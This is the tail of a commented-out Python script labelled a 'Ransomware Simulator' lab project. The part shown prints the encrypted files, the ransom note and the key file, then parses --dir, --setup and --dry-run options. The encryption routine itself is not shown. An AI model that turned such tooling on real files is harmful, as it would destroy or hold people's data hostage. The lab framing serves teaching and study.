#     print(f"  {'FILE':<50}  {'SIZE':>8}")
#     print("  " + "─"*62)
#     for p in sorted(lab_dir.rglob("*.encrypted")):
#         rel = p.relative_to(lab_dir)
#         print(f"  {c(str(rel), YELLOW):<59}  {str(p.stat().st_size)+' B':>8}")
#     # also show README and key
#     for name in [RANSOM_NOTE, KEY_FILE]:
#         p = lab_dir / name
#         if p.exists():
#             print(f"  {c(name, RED if name==RANSOM_NOTE else MAGENTA):<59}  {str(p.stat().st_size)+' B':>8}")

#     print()
#     print(c(f"  ── SUMMARY ────────────────────────────────────────────────", CYAN))
#     print(f"  Files encrypted : {c(str(ok_count), RED+BOLD)}")
#     print(f"  Time elapsed    : {c(f'{elapsed:.2f}s', DIM)}")
#     print(f"  Algorithm       : {c('AES-256 (Fernet)', MAGENTA)}")
#     print(f"\n  {c('To decrypt:', BOLD)}  python3 ransom_decrypt.py --dir {lab_dir}")
#     print()

# # ─────────────────────────────────────────────────────────
# def main():
#     parser = argparse.ArgumentParser(description="Project #11 — Ransomware Simulator")
#     parser.add_argument("--dir",     default=str(DEFAULT_LAB_DIR),
#                         help=f"Test directory (default: {DEFAULT_LAB_DIR})")
#     parser.add_argument("--setup",   action="store_true",
#                         help="Create test files in lab directory")
#     parser.add_argument("--dry-run", action="store_true",
#                         help="Preview files that would be encrypted (no changes)")
#     args = parser.parse_args()

#     lab = Path(args.dir).expanduser().resolve()

#     if args.setup:
#         setup_lab(lab)
#     else:
#         run_encryptor(lab, args.dry_run)

# if __name__ == "__main__":
#     main()